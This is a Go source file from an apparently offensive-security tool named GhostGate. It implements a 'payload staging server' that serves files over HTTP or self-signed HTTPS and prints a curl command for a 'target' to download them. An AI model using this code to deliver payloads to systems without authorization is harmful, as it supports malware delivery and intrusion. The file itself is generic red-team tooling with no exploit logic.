package essentail

import (
	"GhostGate/internal/filesystem"
	"GhostGate/internal/networking"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
)

// StagePayloadDirectory hosts a temporary file server that serves files from stagingDir.
// If sourceDir is non-empty, files are first copied from sourceDir into stagingDir.
// When useTLS is true the server is served over HTTPS. If certFile and keyFile are provided
// those are used; otherwise a self-signed in-memory certificate is generated automatically.
func StagePayloadDirectory(port, stagingDir, sourceDir string, useTLS bool, certFile, keyFile string) {
	// Clean up the staging directory when the server shuts down
	defer func() {
		fmt.Printf("\n[*] Cleaning up: Removing staging directory: %s\n", stagingDir)
		if err := os.RemoveAll(stagingDir); err != nil {
			fmt.Printf("[-] Error cleaning up directory: %v\n", err)
		}
	}()

	// Create the staging directory if it doesn't exist
	if _, err := os.Stat(stagingDir); os.IsNotExist(err) {
		if err := os.MkdirAll(stagingDir, 0755); err != nil {
			log.Fatal("Error creating directory:", err)
		}
	}

	// Copy files from the source directory into the staging directory
	if sourceDir != "" {
		files, err := os.ReadDir(sourceDir)
		if err != nil {
			log.Fatal(err)
		}

		for _, file := range files {
			// Skip subdirectories
			if file.IsDir() {
				continue
			}

			name := file.Name()
			srcPath := filepath.Join(sourceDir, name)
			dstPath := filepath.Join(stagingDir, name)
			filesystem.CopyFile(srcPath, dstPath)
		}
	}

	// Set up signal handling so Ctrl+C triggers a clean shutdown
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)

	// File server handler
	fileServer := http.FileServer(http.Dir(stagingDir))

	// Pick a representative filename for the example curl command
	sampleFile := "file"
	if sourceDir != "" {
		if files, _ := os.ReadDir(sourceDir); len(files) > 0 {
			sampleFile = files[0].Name()
		}
	}

	scheme := "http"
	if useTLS {
		scheme = "https"
	}

	fmt.Printf("[*] GhostGate Payload Staging Server running on port %s\n", port)
	fmt.Printf("[*] Serving files from: %s\n", stagingDir)
	fmt.Printf("[*] Target download example: curl -O %s://%s:%s/%s\n", scheme, networking.GetOutboundIP(), port, sampleFile)
	if useTLS && certFile == "" {
		fmt.Println("[!] Using self-signed certificate — pass -k to curl to skip verification")
	}

	// Start the server in a background goroutine
	go func() {
		var err error

		switch {
		case !useTLS:
			// Plain HTTP
			err = http.ListenAndServe(":"+port, fileServer)

		case certFile != "" && keyFile != "":
			// HTTPS with user-supplied certificate files
			err = http.ListenAndServeTLS(":"+port, certFile, keyFile, fileServer)

		default:
			// HTTPS with an auto-generated in-memory self-signed certificate
			certPem, keyPem, genErr := networking.GenerateInMemoryCert()
			if genErr != nil {
				log.Printf("[-] Failed to generate TLS certificate: %v", genErr)
				stop <- syscall.SIGTERM
				return
			}

			tlsCert, parseErr := tls.X509KeyPair(certPem, keyPem)
			if parseErr != nil {
				log.Printf("[-] Failed to parse TLS key pair: %v", parseErr)
				stop <- syscall.SIGTERM
				return
			}

			tlsCfg := &tls.Config{Certificates: []tls.Certificate{tlsCert}}
			ln, listenErr := tls.Listen("tcp", ":"+port, tlsCfg)
			if listenErr != nil {
				log.Printf("[-] Failed to open TLS listener: %v", listenErr)
				stop <- syscall.SIGTERM
				return
			}

			server := &http.Server{Handler: fileServer}
			err = server.Serve(ln)
		}

		// http.ErrServerClosed is expected on graceful shutdown; anything else is a real failure
		if err != nil && err != http.ErrServerClosed {
			log.Printf("[-] Server error: %v\n", err)
			stop <- syscall.SIGTERM
		}
	}()

	// Block until Ctrl+C or SIGTERM
	<-stop
	fmt.Println("[*] Stopping staging server...")
}

// startTLSServer is a shared helper that creates a TLS listener from in-memory PEM bytes
// and serves the given handler. It returns any error from http.Server.Serve.
func startTLSServer(port string, handler http.Handler, certPem, keyPem []byte) error {
	tlsCert, err := tls.X509KeyPair(certPem, keyPem)
	if err != nil {
		return fmt.Errorf("failed to parse TLS key pair: %w", err)
	}

	tlsCfg := &tls.Config{Certificates: []tls.Certificate{tlsCert}}
	ln, err := tls.Listen("tcp", ":"+port, tlsCfg)
	if err != nil {
		return fmt.Errorf("failed to open TLS listener on :%s: %w", port, err)
	}

	server := &http.Server{Handler: handler}
	return server.Serve(ln)
}

// tlsListenerFromFiles creates a net.Listener backed by TLS using cert/key files from disk.
func tlsListenerFromFiles(port, certFile, keyFile string) (net.Listener, error) {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load TLS certificate: %w", err)
	}
	tlsCfg := &tls.Config{Certificates: []tls.Certificate{cert}}
	return tls.Listen("tcp", ":"+port, tlsCfg)
}